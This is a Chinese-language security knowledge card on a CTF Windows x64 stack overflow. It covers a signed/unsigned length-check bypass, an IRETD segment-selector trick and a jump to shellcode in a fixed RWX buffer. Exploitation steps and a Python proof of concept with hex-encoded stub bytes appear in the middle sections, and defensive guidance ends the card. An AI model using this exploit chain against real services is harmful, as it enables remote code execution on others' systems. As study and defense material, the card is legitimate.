---
id: binary-pwn-stack-win64-movsx-length-iret-segment-shellcode
title: Windows x64 服务栈溢出：movsx 有符号长度检查绕过 + IRETD 运行时构造 CS/SS 跳 shellcode
type: scenario
domain: binary
path: binary/pwn/stack
technique: win64-signedness-length-bypass-iret-segment-shellcode
aliases:
- Ekoparty 2022 BFS
- movsx 长度检查绕过
- movzx recv 零扩展
- IRETD 段选择器
- CS 0x33 SS 0x2B 构造
- 0x2B 0x33 字节过滤绕过
- 固定 RWX 缓冲区 shellcode
tags:
- windows
- x64
- pwn
- stack-overflow
- integer-overflow
- signedness
- iret
- segment-selector
- shellcode
- exploit
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V373
  verified_at: '2026-11-09T06:27:00+08:00'
  notes: 已对照原文全文与 17/17 张截图核对，重点核对卡内数值与截图的一致性：img12/14 EXP 明文 ret_shellcode=0x10000014、cs=0x23、eflags=0x246、sp=0x1000fff0、ss=0x53，g0=89cc、g1_1/g1_2 十六进制、g2=4889cc 与卡内 PoC 逐字节一致；img13 get_header 为 cookie 0x323230326F6B45+'T'+<H 0xf0f0；img15 body=shellcode_buf+填充到 0xf00+b'X'+b'0'*7；img11 movsx eax,[packet_len];cmp eax,0F00h;jle 与 movzx 传 recv 与卡内 movsx/movzx 描述一致；img10 mecopy 对 0x2B/0x33 写 0；img09 recv 11 字节握手/校验；img07 VirtualAlloc(0x10000000,0x1000,0x3000,0x40)；img16/17 监听 31415 与 calc 弹出。原文文字与截图不一致两处已按截图处理并写入卡片：正文说 packet_len=0xFFFF 而 EXP 实际 0xF0F0（卡内两者均提及、PoC 用 0xF0F0）；正文说 CS=0x23/SS=0x53，实际 IRETD 帧的 CS=0x33/SS=0x2B 由 g1_1 算术构造，0x23/0x53 字段被 pop 序列消费（卡内已说明）。未验证点：原文/截图未解释 canary 绕过细节（worker 已跳过，卡不声称绕过 canary，confidence=medium）。原文无组件版本，affected_versions 已 --clear。PoC 未在本机运行。
---

## 一句话结论

Windows x64 服务用 `unsigned __int16 packet_len` 接收长度，检查时被编译成 `movsx` + 有符号 `jle 0x0F00`，而实际 `recv` 长度用 `movzx` 零扩展：发送 `0xF0F0`/`0xFFFF` 这类最高位为 1 的值，检查按负数放行、接收却按 61680/65535 处理，随后 memcpy 式拷贝把数据复制进 0xF00 字节栈缓冲区造成溢出；由于拷贝函数会把 0x2B/0x33 字节清零，EXP 不直接写这些选择器，而是用 IRETD 加运行时算术构造 CS=0x33、SS=0x2B 等 64 位上下文，跳入固定在 `0x10000000` 的 RWX 缓冲区执行 shellcode（弹出 calc.exe）。

## 原理

- **自定义 TCP 协议**：服务监听 31415，先 `recv` 11 字节握手（8 字节 cookie `Eko2022` + 1 字节包类型 `'T'`(84) + 2 字节 `packet_len`），校验通过后回 `Hi\0`；再按 `packet_len` `recv` 包体到全局缓冲区，最后调用 `mecopy_a2_a1(CmdLine, ::buf, lena)` 把包体复制到栈上 0xF00 字节的 `CmdLine`。
- **检查与使用宽度不一致**：反汇编为 `movsx eax, [rsp+…+packet_len]`、`cmp eax, 0F00h`、`jle ok`——按 16 位有符号比较；而 `recv` 前是 `movzx eax, [rsp+…+packet_len]`，把同一字段零扩展为 32/64 位长度。`0xF0F0` 作为有符号 16 位是负数，`jle 0x0F00` 成立；作为无符号数则是 61680，`recv` 允许远超 0xF00 的数据量。`0xFFFF`（-1 / 65535）同理。这是“同一字段两次解释不一致”导致的长度检查绕过，而不是单纯的算术溢出。
- **字节过滤**：`mecopy` 在复制时对每个字节判断，若等于 `0x2B` 或 `0x33` 就在目标位置写 0，否则原样复制。`0x33` 是 x64 代码段选择器 CS，`0x2B` 是 x64 栈段选择器 SS，恰好也是 ASCII 字符 `'3'` 与 `'+'`；因此通过这条路径落到栈上的数据不能依赖这两个字节原样存在，shellcode/地址中包含它们的字节也会被破坏。
- **IRETD 段上下文切换**：`IRETD` 从栈上依次弹出 EIP、CS、EFLAGS、ESP、SS。在 x64 进程中用 `IRETD` 把 CS 置为 `0x33`、SS 置为 `0x2B`，即可带着新的 64 位代码/栈段上下文跳到指定 EIP（在 64 位模式下零扩展为 RIP）。EXP 的小 stub 先用算术构造这两个被过滤的常量：
  - `xor eax,eax; inc eax; or eax,0x2A` → `EAX=0x2B`，`mov ss,eax; mov esi,eax`；
  - `xor eax,0x1B; or eax,0x3` → `(0x2B^0x1B)|3 = 0x33`，`mov edi,eax`。
  然后 `mov esp,ecx` 做栈 pivot、`sub ecx,0x38` 调整、把 `SS=0x2B`、新的 ESP、EFLAGS、`CS=0x33`、EIP 依次压栈，执行 `IRETD`。EIP 落在固定 RWX 缓冲区 `0x10000000` 中的 `mov rsp,rcx` stub，再顺序进入 64 位 shellcode。
- **固定 RWX 缓冲区**：`main` 用 `VirtualAlloc(0x10000000, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)` 分配固定地址可执行内存，包体先被 `recv` 到这里，因此 EXP 可以把 stage/ shellcode 放在这个已知地址，并用溢出覆盖的返回地址/IRET 帧跳进来；这在开启 ASLR 的 Win10/11 上绕开了对模块基址的依赖。
- **为什么可行**：长度检查用有符号比较、长度消费用无符号零扩展；拷贝长度由攻击者控制；固定地址 RWX 提供可靠的代码落点；IRETD 是 ring3 下重载 CS/SS 的合法途径，而运行时算术让 payload 不必包含会被过滤的 0x2B/0x33 字节。

## 触发条件

- Windows x64 服务/程序，从网络或文件读取 16 位长度字段，检查与 `recv`/`memcpy` 使用之间存在符号/零扩展差异（`movsx` 检查 + `movzx` 使用，或 `int16` 比较 + `size_t` 使用）。
- 长度检查阈值小于实际可写数据量，且后续存在向固定栈缓冲区复制用户数据的 memcpy 类函数。
- 目标进程内有固定或可预测的可执行内存（如固定地址 `VirtualAlloc` RWX），或存在可泄露/可绕 ASLR 的代码地址。
- 输入路径上存在字节过滤/替换（本例 0x2B、0x33），EXP 需要避免这些字节出现在会被过滤的载荷区域。
- 目标为 32/64 位混合或 x64 进程，允许 ring3 执行 `IRETD`/`IRETQ` 重载段寄存器（常规用户态代码即可）。

## 利用步骤

1. 逆向协议：确认握手字段（cookie、类型字节、16 位长度）、第二段 `recv` 的缓冲区、`mecopy` 的目标栈缓冲区大小与过滤规则。
2. 对比反汇编：检查长度字段是否在检查处用 `movsx`/有符号比较、在使用处用 `movzx`/无符号长度；选择一个高位置 1 的值（如 `0xF0F0`、`0xFFFF`）同时满足“检查通过”和“接收长度足够大”。
3. 计算溢出偏移与可控区域；构造 body：起始为 stage 数据（返回地址/IRET 帧字段 + 小 stub + shellcode），其余用填充字节补齐到目标长度，必要时在末尾追加额外字节触发越界。
4. 编写 stage：`mov esp,ecx` 做栈 pivot；用 `xor/inc/or` 运行时构造 `0x2B`、`0x33`；压入 `SS, ESP, EFLAGS, CS, EIP` 后 `IRETD`；EIP 指向固定 RWX 缓冲区中的 `mov rsp,rcx` 入口，随后执行 64 位 shellcode（如弹出 calc）。
5. 用 Python 标准库 `socket`/`struct` 发送握手与 body（挑战要求无第三方库）；按需 `sleep` 控制发送节奏，`recv` 直到收到 `Hi` 再发包。
6. 观察服务端是否崩溃/继续监听与 calc 是否弹出；必要时用调试器核对 IRETD 帧的 EIP/CS/EFLAGS/ESP/SS 与栈 pivot 后的寄存器。

## PoC

按原文 EXP 的载荷结构整理（Python，未在本机运行）：

```python
import struct, socket, time

szp = "<I"                       # 原文按 4 字节打包各字段
ret_shellcode = struct.pack(szp, 0x10000014)   # 固定 RWX 缓冲区入口
cs      = struct.pack(szp, 0x23)               # 被 pop 消费的填充字段
eflags  = struct.pack(szp, 0x246)
sp      = struct.pack(szp, 0x1000FFF0)
ss      = struct.pack(szp, 0x53)

g0   = bytes.fromhex("89cc")                   # mov esp, ecx
g1_1 = bytes.fromhex("31c04083c82a8ed089c683f01b83c80389c7")
# xor eax,eax; inc eax; or eax,0x2A -> 0x2B; mov ss,eax; mov esi,eax;
# xor eax,0x1B; or eax,0x3 -> 0x33; mov edi,eax
g1_2 = bytes.fromhex("83e938585b5b5a5a5651535783c02550cf")
# sub ecx,0x38; pop eax; pop ebx x2; pop edx x2;
# push esi(0x2B); push ecx(ESP); push ebx(EFLAGS); push edi(0x33);
# add eax,0x25; push eax(EIP); iretd
g2   = bytes.fromhex("4889cc")                 # mov rsp, rcx

calc_shellcode = b"\x..."                      # 64 位 calc.exe shellcode
payload = ret_shellcode + cs + eflags + sp + ss + g0 + g1_1 + g1_2 + g2 + calc_shellcode

header = struct.pack("<Q", 0x323230326F6B45) + b"T" + struct.pack("<H", 0xF0F0)
body = payload + b"A" * (0xF00 - len(payload)) + b"X" + b"0" * 7

s = socket.create_connection(("target", 31415))
s.sendall(b"Hello\0\0\0\0")
time.sleep(0.2)
s.recv(16)                                     # "Hi"
s.sendall(header + body)
time.sleep(0.2)
print(s.recv(1024))
```

关键点：`0xF0F0` 同时通过有符号 `jle 0x0F00` 检查并作为 61680 的无符号接收上限；`g1_1` 用算术构造 0x2B/0x33；`IRETD` 帧的 EIP 指向固定 RWX 缓冲区中的 `g2`，`g2` 恢复 RSP 后进入 shellcode。原文 EXP 还包含 `0x23`/`0x53`/`0x1000FFF0` 等字段，它们被 stub 的 pop 序列消费或作为填充，不直接决定控制流。

## 变体与关联

- **同类长度检查绕过**：`int16` 长度符号绕过（0x8000 取负、`(__int16)v1 > 2` 等）在 Linux CTF 中已有实例；见 [[ctf-pwn-int16-length-sign-bypass-sprintf-format-canary-orw]]。本卡是 Windows x64 服务中的 `movsx` 检查 / `movzx` 使用差异，触发值与后续利用链不同。
- **32 位兼容段切换**：Linux pwn 常用 `retfq` 切到 32 位兼容模式调用 i386 syscall 再切回；见 [[binary-pwn-sandbox-escape-orw-missing-open-openat-retfq-i386-open]]。Windows 对应物是 `IRETD` 重载 CS/SS，本卡用运行时算术构造选择器以绕字节过滤。
- **Windows x64 shellcode**：如需自行编写 64 位 shellcode，可参考 PEB/EAT 解析与 Winsock/CreateProcessA 的写法；见 [[pentest-c2-windows-x64-asm-reverse-shell-shellcode]]。
- **无固定 RWX 时的替代**：可用 `VirtualProtect` 改页属性、ROP 调用 `VirtualAlloc`，或利用可写可执行节；这些会引入 ASLR/CFG 绕过需求。
- **过滤字符变体**：若过滤的是其他字节（如 0x00、0x0A），同样需要在运行期构造被禁常量，或对 shellcode 做编码器处理。

## 检测与防御

- **代码审计**：长度字段的检查与使用必须保持同一类型/宽度；对有符号/无符号混用、`movsx`/`movzx` 不一致、16 位长度进入 `size_t` 的路径重点审计；比较对象应是目标缓冲区实际大小。
- **安全编译**：启用 `/GS`、CFG、ASLR、DEP；不要用 `VirtualAlloc` 分配固定地址 RWX 内存，必要时改为 RW + `VirtualProtect` 临时执行，并避免可预测地址。
- **协议实现**：接收长度先按无符号处理并与缓冲区上限比较，再按实际接收字节数复制；不要依赖“过滤某些字节”作为安全措施（过滤器只增加攻击者编码成本）。
- **运行时检测**：监控进程内出现 `IRETD`/`IRETQ` 重载 CS/SS、固定地址 RWX 执行、异常返回地址指向非模块内存的行为；EDR 可对 `VirtualAlloc(RWX)` + 网络接收 + 跳转执行链告警。
- **暴露面**：此类服务不应直接暴露在不可信网络；若必须暴露，前置长度/协议校验网关并限制单连接数据量。
